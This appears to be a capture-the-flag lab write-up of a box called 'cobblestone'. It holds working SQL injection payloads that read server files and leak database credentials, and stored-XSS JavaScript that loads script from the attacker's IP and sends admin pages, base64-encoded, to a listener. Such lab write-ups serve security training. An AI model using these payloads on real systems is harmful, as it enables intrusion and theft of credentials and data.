## Nmap scan
- Initial Nmap scan reveals:
```
nmap -sV -sC -vv 10.129.232.170

---OUTPUT---
Nmap scan report for cobblestone.htb (10.129.232.170)
Host is up, received echo-reply ttl 63 (0.016s latency).
Scanned at 2026-04-02 08:53:26 EDT for 8s
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
| ssh-hostkey: 
|   256 50:ef:5f:db:82:03:36:51:27:6c:6b:a6:fc:3f:5a:9f (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBBCfBUkQ4szy00s+EbTzIMq4Cv/mOkGWCD8xewIgvZ4zDI5pPhUaVYNsPaUmYzXgi0DzCy6s//8a1YFcyH398Nc=
|   256 e2:1d:f3:e9:6a:ce:fb:e0:13:9b:07:91:28:38:ec:5d (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICuDtua7ciUfRA2uUH+ergsCOdq0Aaoakru1kQ9/OWPs
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.62
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Cobblestone - Official Website
|_http-server-header: Apache/2.4.62 (Debian)
Service Info: Host: 127.0.0.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
![[Pasted image 20260402085544.png]]

- Clicking on the 3 links lead to 3 addresses:
```
http://vote.cobblestone.htb/
http://deploy.cobblestone.htb/
http://cobblestone.htb/login.php
```
- Adding the first 2 to /etc/hosts
- I get the following sites:
- Deply:
![[Pasted image 20260402085817.png]]
- Login
![[Pasted image 20260402085833.png]]

- Vote:
![[Pasted image 20260402085918.png]]

- I register a test user :`test:test`

![[Pasted image 20260402090204.png]]

- I can then login which leads me to the voting page:
![[Pasted image 20260402090431.png]]

- We can suggest a server :
	- Inititally I tried my Ip and just `http://test` and it just responds with a Approved:false message.
	- I then tried to see if SQLi was possible and interestingly adding `' ;`  doesnt respond with the same error.
- I then test for SQLi using sqlmap and find that it is vulnerable:
```
sqlmap -r test --batch --level 5 --risk 3 -threads=10 

---OUTPUT---     
        ___
       __H__                                                                                                                 
 ___ ___[)]_____ ___ ___  {1.10.2#stable}                                                                                    
|_ -| . ["]     | .'| . |                                                                                                    
|___|_  [']_|_|_|__,|  _|                                                                                                    
      |_|V...       |_|   https://sqlmap.org                                                                                 

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 11:10:58 /2026-04-02/

[11:10:59] [INFO] parsing HTTP request from 'test'
[11:10:59] [INFO] resuming back-end DBMS 'mysql' 
[11:10:59] [INFO] testing connection to the target URL
got a 302 redirect to 'http://vote.cobblestone.htb/details.php?id=85'. Do you want to follow? [Y/n] Y
redirect is a result of a POST request. Do you want to resend original POST data to a new location? [Y/n] Y
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: url (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: url=test' AND 8220=8220-- avxg

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: url=test' AND (SELECT 4523 FROM (SELECT(SLEEP(5)))Muhp)-- AOAp

    Type: UNION query
    Title: Generic UNION query (NULL) - 5 columns
    Payload: url=-7142' UNION ALL SELECT CONCAT(0x716a6b6b71,0x62724d4c69674e41576668696151415a4b484c6a6c746b59736b6d736a784b7a59494364444e4d59,0x716a627671),NULL,NULL,NULL,NULL-- -
---
[11:10:59] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian
web application technology: Apache 2.4.62
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[11:10:59] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/vote.cobblestone.htb'

[*] ending @ 11:10:59 /2026-04-02/
```

- shows its vulnerable and reading the log file I see we can use UNION injection and it has 5 columns

- I try to read 000-defaults.conf to see paths:
```
url=test' UNION SELECT 1,2,3,load_file('/etc/apache2/sites-enabled/000-default.conf'),5-- -
```

![[Pasted image 20260402184147.png]]
```
Suggestion #1 - RewriteEngine On RewriteCond %{HTTP_HOST} !^cobblestone.htb$ RewriteRule /.* http://cobblestone.htb/ [R] ServerName 127.0.0.1 ProxyPass "/cobbler_api" "http://127.0.0.1:25151/" ProxyPassReverse "/cobbler_api" "http://127.0.0.1:25151/" ServerName cobblestone.htb ServerAdmin cobble@cobblestone.htb DocumentRoot /var/www/html AAHatName cobblestone ErrorLog ${APACHE_LOG_DIR}/error.log CustomLog ${APACHE_LOG_DIR}/access.log combined RewriteEngine On RewriteCond %{HTTP_HOST} !^cobblestone.htb$ RewriteRule /.* http://cobblestone.htb/ [R] Alias /cobbler /srv/www/cobbler Options Indexes FollowSymLinks AllowOverride None Require all granted ServerName deploy.cobblestone.htb ServerAdmin cobble@cobblestone.htb DocumentRoot /var/www/deploy RewriteEngine On RewriteCond %{HTTP_HOST} !^deploy.cobblestone.htb$ RewriteRule /.* http://deploy.cobblestone.htb/ [R] ServerName vote.cobblestone.htb ServerAdmin cobble@cobblestone.htb DocumentRoot /var/www/vote RewriteEngine On RewriteCond %{HTTP_HOST} !^vote.cobblestone.htb$ RewriteRule /.* http://vote.cobblestone.htb/ [R] 
```
- I see the web root is `/var/www/vote`
- Furthermore analyzing packets from burp suite I see an interesting link : https://bybilly.uk
![[Pasted image 20260409084119.png]]

- ONe of the projects shows the same template:
![[Pasted image 20260409084221.png]]

- The source leads to this link : https://github.com/bybilly/minecraft-web-portal

- Looking at the layout I see a skins website too so I check whether skins.php and deploy.php exist
```
url=test' UNION SELECT 1,2,3,load_file('/var/www/html/skins.php'),5-- -


---OUTPUT---
Suggestion #1 - prepare("SELECT * FROM skins"); $stmt->execute(); $stmt->bind_result($id, $name, $path, $imagepath); $skins = array(); while ($stmt->fetch()) { $skins[] = array( 'id' => $id, 'Name' => $name, 'Path' => $path, 'ImagePath' => $imagepath ); } $stmt->close(); // Fetch all users $users = []; $stmt = $conn->prepare("SELECT id, username, firstname, lastname, email, role, register_ip from users"); $stmt->execute(); $stmt->bind_result($id, $name, $first, $last, $email, $role, $ip); while ($stmt->fetch()) { if ($ip === $_SERVER['REMOTE_ADDR'] || $ip === '*') { $users[] = [ 'id' => $id, 'name' => $name, 'first' => $first, 'last' => $last, 'email' => $email, 'role' => $role ]; } else { continue; } } $stmt->close(); // Fetch all suggestions $suggestions = []; $stmt = $conn->prepare("SELECT id, username, name, url from suggestions"); $stmt->execute(); $stmt->bind_result($id, $username, $name, $url); while ($stmt->fetch()) { $suggestions[] = [ 'id' => $id, 'username' => $username, 'name' => $name, 'url' => $url, ]; } $stmt->close(); // Close db session $conn->close(); // Check if session is valid if (!isset($_SESSION['id'])) { header("Location: login.php"); exit(); } ?>[url=test' UNION SELECT 1,2,3,load_file('/var/www/vote/db.php'),5-- -](http://vote.cobblestone.htb/details.php?id=4)
```
- It talks of a db session. (can also use the below command with sqlmap to see the full putput:
```
sqlmap -r req --batch --file-read /var/www/html/skins.php
```
![[Pasted image 20260505064707.png]]
- we see a db connection is made and via sqlmap that its a db/connection.php path. I initially tried `/var/www/html/db/connection.php` butit said connection failed. I had checked my user 
```
url=-9999' UNION ALL SELECT 1,2,3,user(),5-- -
```
![[Pasted image 20260505064835.png]]
- As well as from default config earlier we know its vote. SOo I check it via the vote path:
```
sqlmap -r req --batch --file-read /var/www/vote/db/connection.php

---OUTPUT---
        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.10.3#stable}
|_ -| . [(]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 05:42:08 /2026-05-05/

[05:42:08] [INFO] parsing HTTP request from 'req'
[05:42:09] [INFO] resuming back-end DBMS 'mysql' 
[05:42:09] [INFO] testing connection to the target URL
got a 302 redirect to 'http://vote.cobblestone.htb/details.php?id=6'. Do you want to follow? [Y/n] Y
redirect is a result of a POST request. Do you want to resend original POST data to a new location? [Y/n] Y
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: url (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: url=test' AND 8220=8220-- avxg

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: url=test' AND (SELECT 4523 FROM (SELECT(SLEEP(5)))Muhp)-- AOAp

    Type: UNION query
    Title: Generic UNION query (NULL) - 5 columns
    Payload: url=-7142' UNION ALL SELECT CONCAT(0x716a6b6b71,0x62724d4c69674e41576668696151415a4b484c6a6c746b59736b6d736a784b7a59494364444e4d59,0x716a627671),NULL,NULL,NULL,NULL-- -
---
[05:42:09] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian
web application technology: Apache 2.4.62
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[05:42:09] [INFO] fingerprinting the back-end DBMS operating system
[05:42:09] [INFO] the back-end DBMS operating system is Linux
[05:42:09] [INFO] fetching file: '/var/www/vote/db/connection.php'
[05:42:09] [WARNING] reflective value(s) found and filtering out
do you want confirmation that the remote file '/var/www/vote/db/connection.php' has been successfully downloaded from the back-end DBMS file system? [Y/n] Y
[05:42:09] [INFO] the local file '/home/kali/.local/share/sqlmap/output/vote.cobblestone.htb/files/_var_www_vote_db_connection.php' and the remote file '/var/www/vote/db/connection.php' have the same size (297 B)
files saved to [1]:
[*] /home/kali/.local/share/sqlmap/output/vote.cobblestone.htb/files/_var_www_vote_db_connection.php (same file)

[05:42:09] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/vote.cobblestone.htb'

[*] ending @ 05:42:09 /2026-05-05/
```

- Then on reading the file:
```
cat /home/kali/.local/share/sqlmap/output/vote.cobblestone.htb/files/_var_www_vote_db_connection.php
<?php

$dbserver = "localhost";
$username = "voteuser";
$password = "thaixu6eih0Iicho]irahvoh6aigh>ie";
$dbname = "vote";

$conn = new mysqli($dbserver, $username, $password, $dbname);

// Check connection
if ($conn->connect_errno > 0) {
    die("Connection failed: " . $conn->connect_error);
}
?>
```

- We get some credentials : `voteuser`:`thaixu6eih0Iicho]irahvoh6aigh>ie`
- in the skins page there is a suggest skin tab where we could set our server and file name that it downloads a skin.
![[Pasted image 20260505065348.png]]

- I search for suggest_skin.php in the sqli (first online and then via sqlmap to check the contents)
```
sqlmap -r req --batch --file-read /var/www/html/suggest_skin.php                            
        ___
       __H__                                                                                                                                                                                                                                                 
 ___ ___[,]_____ ___ ___  {1.10.3#stable}                                                                                                                                                                                                                    
|_ -| . [)]     | .'| . |                                                                                                                                                                                                                                    
|___|_  [(]_|_|_|__,|  _|                                                                                                                                                                                                                                    
      |_|V...       |_|   https://sqlmap.org                                                                                                                                                                                                                 

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 06:54:55 /2026-05-05/

[06:54:55] [INFO] parsing HTTP request from 'req'
[06:54:56] [INFO] resuming back-end DBMS 'mysql' 
[06:54:56] [INFO] testing connection to the target URL
got a 302 redirect to 'http://vote.cobblestone.htb/details.php?id=5'. Do you want to follow? [Y/n] Y
redirect is a result of a POST request. Do you want to resend original POST data to a new location? [Y/n] Y
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: url (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: url=test' AND 8220=8220-- avxg

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: url=test' AND (SELECT 4523 FROM (SELECT(SLEEP(5)))Muhp)-- AOAp

    Type: UNION query
    Title: Generic UNION query (NULL) - 5 columns
    Payload: url=-7142' UNION ALL SELECT CONCAT(0x716a6b6b71,0x62724d4c69674e41576668696151415a4b484c6a6c746b59736b6d736a784b7a59494364444e4d59,0x716a627671),NULL,NULL,NULL,NULL-- -
---
[06:54:56] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian
web application technology: Apache 2.4.62
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[06:54:56] [INFO] fingerprinting the back-end DBMS operating system
[06:54:56] [INFO] the back-end DBMS operating system is Linux
[06:54:56] [INFO] fetching file: '/var/www/html/suggest_skin.php'
[06:54:56] [WARNING] reflective value(s) found and filtering out
do you want confirmation that the remote file '/var/www/html/suggest_skin.php' has been successfully downloaded from the back-end DBMS file system? [Y/n] Y
[06:54:56] [INFO] the local file '/home/kali/.local/share/sqlmap/output/vote.cobblestone.htb/files/_var_www_html_suggest_skin.php' and the remote file '/var/www/html/suggest_skin.php' have the same size (1056 B)
files saved to [1]:
[*] /home/kali/.local/share/sqlmap/output/vote.cobblestone.htb/files/_var_www_html_suggest_skin.php (same file)

[06:54:56] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/vote.cobblestone.htb'

[*] ending @ 06:54:56 /2026-05-05/
```

- Reading it :
```
cat /home/kali/.local/share/sqlmap/output/vote.cobblestone.htb/files/_var_www_html_suggest_skin.php
<?php


include('db/connection.php');
session_start();

if (!isset($_SESSION['role'])) {
http_response_code(403); // Optional: send 403 Forbidden
die('Access denied.');
}


$_SESSION['suggestion_message'] = '';
$_SESSION['suggestion_message_type'] = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $user = $_POST['username'];
    $name = $_POST['name'];
    $url = $_POST['url'];

    $stmt = $conn->prepare("INSERT INTO suggestions (username, name, url) VALUES (?, ?, ?)");
    $stmt->bind_param("sss", $user, $name, $url);

    if ($stmt->execute()) {
        $_SESSION['suggestion_message'] = "Suggestion has been added succesfully and will be reviewed by an admin.";
        $_SESSION['suggestion_message_type'] = "success";
        header("Location: skins.php");
        exit();
    } else {
        $_SESSION['suggestion_message'] = "Something went wrong submitting your suggestion.";
        $_SESSION['suggestion_message_type'] = "error";
        header("Location: skins.php");
        exit();
    }

    $stmt->close();
}
$conn->close();

?>   
```

- This doesn't give much. But we know that an admin downloads the file from the url we give and probably previews it somewhere so there must be a code to preview the file uploaded.
- Assuming it is xss vulnerable we can test which page returns something:

- we set up two python servers. one to host our file and one to receive responses:
```
python3 -m http.server 80

python3 -m http.server 4444
```
- We createa a test xss file `works.js`:
```(async () => {
  await fetch('http://10.10.16.126:4444/?xss=works');
})();

```
- We input our xss payload in the browser calling oour file:
```
<img src=x onerror="var s=document.createElement('script');s.src='http://10.10.16.126/works.js';document.body.appendChild(s)">
```
![[Pasted image 20260506123057.png]]

- We get a response:
![[Pasted image 20260506123120.png]]
![[Pasted image 20260506123144.png]]

- Lets try to read skins.php:
```
(async () => {
  const H='http://10.10.16.126:4444';

  let r = await fetch('http://cobblestone.htb/skins.php');
  let t = await r.text();

  let encoded = btoa(unescape(encodeURIComponent(t)));

  for(let i=0;i*800<encoded.length;i++){
    await fetch(H+'/?i='+i+'&r='+encoded.substr(i*800,800));
  }
})();
```
- We get skins.php but due to how big it is it gets truncated.
- We try to read the last 2000 lines as phpinfo is most likely stated there:
```
cat skins.js

(async () => {
  const H = 'http://10.10.16.126:4444';
  
  let r = await fetch('http://cobblestone.htb/skins.php');
  let t = await r.text();
  
  // Get everything after the last </div> - the footer area
  const footer = t.substring(t.lastIndexOf('<footer'));
  const bottom = t.substring(t.length - 2000); // last 2000 chars
  
  const encoded = btoa(unescape(encodeURIComponent(bottom)));
  for(let i=0; i*800 < encoded.length; i++){
    await fetch(H+'/?i='+i+'&r='+encoded.substr(i*800,800));
  }
})();
```

- We get a response:
```
Serving HTTP on 0.0.0.0 port 4444 (http://0.0.0.0:4444/) ...
10.129.48.200 - - [06/May/2026 10:29:07] "GET /?i=0&r=dGQgY2xhc3M9InRleHQtbGlnaHQgdGV4dC1ib2xkIj4KICAgICAgICAgICAgc2tpbnMKICAgICAgICA8L3RkPgogICAgICAgIDx0ZCBjbGFzcz0ic3VnZ2VzdGlvbi11cmwgdGV4dC1saWdodCB0ZXh0LWJvbGQiPgogICAgICAgICAgICA8aW1nIHNyYz14IG9uZXJyb3I9InZhciBzPWRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ3NjcmlwdCcpO3Muc3JjPSdodHRwOi8vMTAuMTAuMTYuMTI2L2luZGV4LmpzJztkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKHMpIj4KICAgICAgICA8L3RkPgogICAgICAgIDx0ZD4KICAgICAgICAgICAgPGJ1dHRvbiBjbGFzcz0iYnRuIGJ0bi1zdWNjZXNzIiBvbmNsaWNrPSJhbGVydCgnTm90IHlldCBpbXBsZW1lbnRlZCcpIj5BcHByb3ZlPC9idXR0b24+CiAgICAgICAgPC90ZD4KICAgICAgICA8dGQ+CiAgICAgICAgICAgIDxidXR0b24gY2xhc3M9ImJ0biBidG4tZGFuZ2VyIiBvbmNsaWNrPSJhbGVydCgnTm90IHlldCBpbXBsZW1lbnRlZCcpIj5EZWNsaW5lPC9idXR0b24+CiAgICAgICAgPC90ZD4KICAgIDwvdHI+CgogICAgICAgIDx0ciBzY29wZT0icm93Ij4KICAgICAgICA8dGQgY2xhc3M9InRleHQtbGlnaHQgdGV4dC1i HTTP/1.1" 200 -
10.129.48.200 - - [06/May/2026 10:29:07] "GET /?i=0&r=PCEtLSBQcm91ZGx5IGNvZGVkIGJ5IEJpbGx5IChodHRwczovL2J5YmlsbHkudWspIC0tPg0KPCEtLSBWZXJzaW9uOiAxLjkuMiAtLT4NCg0KDQo8IURPQ1RZUEUgaHRtbD4NCjxodG1sPg0KPGhlYWQ+DQoJPCEtLSBJbmZvIG1ldGEgdGFncywgaW1wb3J0YW50IGZvciBzb2NpYWwgbWVkaWEgKyBTRU8gLS0+DQoJPHRpdGxlPkNvYmJsZXN0b25lIC0gU2tpbnM8L3RpdGxlPg0KDQoJPG1ldGEgbmFtZT0idmlld3BvcnQiIGNvbnRlbnQ9IndpZHRoPWRldmljZS13aWR0aCwgaW5pdGlhbC1zY2FsZT0xLjAiPg0KCTxtZXRhIGNoYXJzZXQ9InV0Zi04Ij4NCiAgICA8bGluayByZWw9InN0eWxlc2hlZXQiIGhyZWY9ImNzcy9ib290c3RyYXAubWluLmNzcyI+DQoJPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiBocmVmPSJjc3MvYWxsLm1pbi5jc3MiPg0KCTxsaW5rIHJlbD0ic3R5bGVzaGVldCIgaHJlZj0iY3NzL3N0eWxlc2hlZXQuY3NzIj4NCg0KPC9oZWFkPg0KPGJvZHk+DQoJPGRpdiBjbGFzcz0iY29udGFpbmVyIj4NCgkJPGgxIGNsYXNzPSJ0ZXh0LWxpZ2h0IGRpc3BsYXktMyI+V2VsY29tZSBhZG1pbjwvaDE+DQoJICAgIDwhLS0gVGFicyBOYXZpZ2F0aW9uIC0t HTTP/1.1" 200 -
10.129.48.200 - - [06/May/2026 10:29:07] "GET /?i=1&r=b2xkIiBpZD0iMiI+CiAgICAgICAgICAgIDIKICAgICAgICA8L3RkPgogICAgICAgIDx0ZCBjbGFzcz0idGV4dC1saWdodCB0ZXh0LWJvbGQiPgogICAgICAgICAgICB0ZXN0CiAgICAgICAgPC90ZD4KICAgICAgICA8dGQgY2xhc3M9InRleHQtbGlnaHQgdGV4dC1ib2xkIj4KICAgICAgICAgICAgc2tpbnMKICAgICAgICA8L3RkPgogICAgICAgIDx0ZCBjbGFzcz0ic3VnZ2VzdGlvbi11cmwgdGV4dC1saWdodCB0ZXh0LWJvbGQiPgogICAgICAgICAgICA8aW1nIHNyYz14IG9uZXJyb3I9InZhciBzPWRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ3NjcmlwdCcpO3Muc3JjPSdodHRwOi8vMTAuMTAuMTYuMTI2L3NraW5zLmpzJztkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKHMpIj4KICAgICAgICA8L3RkPgogICAgICAgIDx0ZD4KICAgICAgICAgICAgPGJ1dHRvbiBjbGFzcz0iYnRuIGJ0bi1zdWNjZXNzIiBvbmNsaWNrPSJhbGVydCgnTm90IHlldCBpbXBsZW1lbnRlZCcpIj5BcHByb3ZlPC9idXR0b24+CiAgICAgICAgPC90ZD4KICAgICAgICA8dGQ+CiAgICAgICAgICAgIDxidXR0b24gY2xhc3M9ImJ0biBidG4tZGFuZ2VyIiBvbmNsaWNrPSJhbGVydCgnTm90 HTTP/1.1" 200 -
10.129.48.200 - - [06/May/2026 10:29:07] "GET /?i=1&r=Pg0KICAgICAgICA8dWwgY2xhc3M9Im5hdiBuYXYtdGFicyIgaWQ9InNraW5zQWRtaW5UYWJzIiByb2xlPSJ0YWJsaXN0Ij4NCiAgICAgICAgICAgIDxsaSBjbGFzcz0ibmF2LWl0ZW0iIHJvbGU9InByZXNlbnRhdGlvbiI+DQogICAgICAgICAgICAgICAgPGJ1dHRvbiBjbGFzcz0ibmF2LWxpbmsgYWN0aXZlIHRleHQtZGFyayIgaWQ9InNraW5zLXRhYiIgZGF0YS1icy10b2dnbGU9InRhYiIgZGF0YS1icy10YXJnZXQ9IiNza2lucyIgdHlwZT0iYnV0dG9uIiByb2xlPSJ0YWIiIGFyaWEtY29udHJvbHM9InNraW5zIiBhcmlhLXNlbGVjdGVkPSJ0cnVlIj5Ta2luczwvYnV0dG9uPg0KICAgICAgICAgICAgPC9saT4NCgkJCQkJCTxsaSBjbGFzcz0ibmF2LWl0ZW0iIHJvbGU9InByZXNlbnRhdGlvbiI+DQoJPGJ1dHRvbiBjbGFzcz0ibmF2LWxpbmsgdGV4dC1kYXJrIiBpZD0idXBsb2FkLXRhYiIgZGF0YS1icy10b2dnbGU9InRhYiIgZGF0YS1icy10YXJnZXQ9IiN1cGxvYWQiIHR5cGU9ImJ1dHRvbiIgcm9sZT0idGFiIiBhcmlhLWNvbnRyb2xzPSJ1cGxvYWQiIGFyaWEtc2VsZWN0ZWQ9ImZhbHNlIj5VcGxvYWQgU2tpbjwvYnV0dG9uPg0KPC9saT4NCjxsaSBj HTTP/1.1" 200 -
10.129.48.200 - - [06/May/2026 10:29:07] "GET /?i=2&r=IHlldCBpbXBsZW1lbnRlZCcpIj5EZWNsaW5lPC9idXR0b24+CiAgICAgICAgPC90ZD4KICAgIDwvdHI+CgogICAgPC90YWJsZT4KCQkJPC9kaXY+DQoJCTwvZGl2Pg0KCQk8Zm9vdGVyIGNsYXNzPSJtdC1hdXRvIj4KICA8ZGl2IGNsYXNzPSJjb250YWluZXIiPgogICAgPGRpdiBjbGFzcz0icm93Ij4KICAgICAgPGRpdiBjbGFzcz0iY29sLW1kLTEyIG1iLTMiPgogICAgICAgIDxwPjxhIGNsYXNzPSJ0ZXh0LWJvbGQgdGV4dC1saWdodCIgaHJlZj0ic2tpbnNfYXBwX2FkbWluX3NlcnZlcl9pbmZvLnBocCIgdGFyZ2V0PSJfYmxhbmsiPkFkbWluIHNlcnZlciBpbmZvPC9hPjwvcD4KICAgICAgPC9kaXY+CiAgICA8L2Rpdj4KICA8L2Rpdj4KPC9mb290ZXI+Cgk8L2Rpdj4NCg0KICAgIDxzY3JpcHQ+DQogICAgICAgICBkb2N1bWVudC5hZGRFdmVudExpc3RlbmVyKCJET01Db250ZW50TG9hZGVkIiwgZnVuY3Rpb24gKCkgew0KICAgICAgICAgICAgICAgICAgICAgICAgfSk7DQogICAgPC9zY3JpcHQ+DQoNCgk8c2NyaXB0IHNyYz0ianMvanF1ZXJ5Lm1pbi5qcyIgdHlwZT0idGV4dC9qYXZhc2NyaXB0Ij48L3NjcmlwdD4NCiAgICA8c2NyaXB0IHNyYz0ianMv HTTP/1.1" 200 -
10.129.48.200 - - [06/May/2026 10:29:07] "GET /?i=2&r=bGFzcz0ibmF2LWl0ZW0iIHJvbGU9InByZXNlbnRhdGlvbiI+DQoJPGJ1dHRvbiBjbGFzcz0ibmF2LWxpbmsgdGV4dC1kYXJrIiBpZD0idXNlci10YWIiIGRhdGEtYnMtdG9nZ2xlPSJ0YWIiIGRhdGEtYnMtdGFyZ2V0PSIjdXNlciIgdHlwZT0iYnV0dG9uIiByb2xlPSJ0YWIiIGFyaWEtY29udHJvbHM9InVzZXIiIGFyaWEtc2VsZWN0ZWQ9ImZhbHNlIj5Vc2VyIE1hbmFnZW1lbnQ8L2J1dHRvbj4NCjwvbGk+DQo8bGkgY2xhc3M9Im5hdi1pdGVtIiByb2xlPSJwcmVzZW50YXRpb24iPg0KCTxidXR0b24gY2xhc3M9Im5hdi1saW5rIHRleHQtZGFyayIgaWQ9InN1Z2dlc3QtdGFiIiBkYXRhLWJzLXRvZ2dsZT0idGFiIiBkYXRhLWJzLXRhcmdldD0iI3N1Z2dlc3QiIHR5cGU9ImJ1dHRvbiIgcm9sZT0idGFiIiBhcmlhLWNvbnRyb2xzPSJzdWdnZXN0IiBhcmlhLXNlbGVjdGVkPSJmYWxzZSI+U2tpbiBTdWdnZXN0aW9uczwvYnV0dG9uPg0KPC9saT4gICAgICAgICAgICA8bGkgY2xhc3M9Im5hdi1pdGVtIiByb2xlPSJwcmVzZW50YXRpb24iPg0KICAgICAgICAgICAgICAgIDxhIGhyZWY9ImxvZ291dC5waHAiIGNsYXNzPSJuYXYtbGluayB0ZXh0LWRhcmsiIGlk HTTP/1.1" 200 -
10.129.48.200 - - [06/May/2026 10:29:07] "GET /?i=3&r=Ym9vdHN0cmFwLmJ1bmRsZS5taW4uanMiIHR5cGU9InRleHQvamF2YXNjcmlwdCI+PC9zY3JpcHQ+DQoJPHNjcmlwdCBzcmM9ImpzL2ZpcmVmbHkuanMiIHR5cGU9InRleHQvamF2YXNjcmlwdCI+PC9zY3JpcHQ+DQoJPHNjcmlwdCBzcmM9ImpzL21haW4uanMiIHR5cGU9InRleHQvamF2YXNjcmlwdCI+PC9zY3JpcHQ+DQo8L2JvZHk+DQo8L2h0bWw+DQo= HTTP/1.1" 200 -
10.129.48.200 - - [06/May/2026 10:29:07] "GET /?i=3&r=PSJsb2dvdXQtdGFiIiB0eXBlPSJidXR0b24iIHJvbGU9InRhYiIgYXJpYS1jb250cm9scz0iYWRtaW4iIGFyaWEtc2VsZWN0ZWQ9ImZhbHNlIj5Mb2dvdXQ8L2E+DQogICAgICAgICAgICA8L2xpPg0KICAgICAgICA8L3VsPg0KDQogICAgICAgIDwhLS0gU2tpbnMgQ29udGVudCAtLT4NCiAgICAgICAgPGRpdiBjbGFzcz0idGFiLWNvbnRlbnQiIGlkPSJza2luc0FkbWluVGFic0NvbnRlbnQiPg0KCQkJPGRpdiBjbGFzcz0idGFiLXBhbmUgZmFkZSBzaG93IGFjdGl2ZSBwLTQiIGlkPSJza2lucyIgcm9sZT0idGFicGFuZWwiIGFyaWEtbGFiZWxsZWRieT0ic2tpbnMtdGFiIj4NCgkJCQk8dGFibGUgY2xhc3M9InRhYmxlIHRhYmxlLWRhcmsgdGFibGUtc3RyaXBlZCB0YWJsZS1saWdodCI+CiAgICA8dGhlYWQ+CiAgICAgICAgPHRyIGNsYXNzPSJ0YWJsZS1kYXJrIj4KICAgICAgICAgICAgPHRoIHNjb3BlPSJjb2wiPk5hbWU8L3RoPgogICAgICAgICAgICA8dGggc2NvcGU9ImNvbCI+UHJldmlldzwvdGg+CiAgICAgICAgICAgIDx0aCBzY29wZT0iY29sIj5Eb3dubG9hZDwvdGg+CiAgICAgICAgPC90cj4KICAgIDwvdGhlYWQ+CiAgICAgICAgPHRyIHNjb3Bl HTTP/1.1" 200 -
10.129.48.200 - - [06/May/2026 10:29:08] "GET /?i=4&r=PSJyb3ciPgogICAgICAgIDx0ZCBjbGFzcz0idGV4dC1saWdodCB0ZXh0LWJvbGQiIGlkPSIxIj4KICAgICAgICBTd29yZDQwMDAKICAgICAgICA8L3RkPgogICAgICAgIDx0ZD4KICAgICAgICAgICAgPGltZyBzcmM9Ii9za2lucy9wcmV2aWV3X3N3b3JkNDAwMC5wbmciIGFsdD0iU3dvcmQ0MDAwIiBoZWlnaHQ9IjE1MHB4IiAvPgogICAgICAgIDwvdGQ+CiAgICAgICAgPHRkPgogICAgICAgICAgICA8YSBocmVmPSJkb3dubG9hZC5waHA/c2tpbj0vc2tpbnMvc3dvcmQ0MDAwLnBuZyI+PGkgY2xhc3M9ImZhcyBmYS1kb3dubG9hZCB0ZXh0LWxpZ2h0Ij48L2k+PC9hPgogICAgICAgIDwvdGQ+CiAgICA8L3RyPgogICAgICAgIDx0ciBzY29wZT0icm93Ij4KICAgICAgICA8dGQgY2xhc3M9InRleHQtbGlnaHQgdGV4dC1ib2xkIiBpZD0iMiI+CiAgICAgICAgRWxEZWF0aGx5CiAgICAgICAgPC90ZD4KICAgICAgICA8dGQ+CiAgICAgICAgICAgIDxpbWcgc3JjPSIvc2tpbnMvcHJldmlld19lbGRlYXRobHkucG5nIiBhbHQ9IkVsRGVhdGhseSIgaGVpZ2h0PSIxNTBweCIgLz4KICAgICAgICA8L3RkPgogICAgICAgIDx0ZD4KICAgICAgICAgICAgPGEgaHJlZj0i HTTP/1.1" 200 -
